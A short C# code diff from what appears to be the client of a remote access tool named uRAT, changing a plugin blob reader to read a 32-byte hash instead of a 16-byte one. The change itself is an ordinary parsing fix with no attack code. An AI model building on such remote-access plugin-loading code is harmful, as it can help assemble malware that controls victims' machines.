@@ -68,7 +68,7 @@ namespace uRAT.Client.Tools.Blob
             var plugin = new BlobClientPlugin()
             {
                 PluginGuid = _reader.ReadGuid(),
-                Hash = _reader.ReadBytes(16),
+                Hash = _reader.ReadBytes(32),
                 Data = _reader.ReadBytes(size),
                 Size = size,
                 Offset = offset
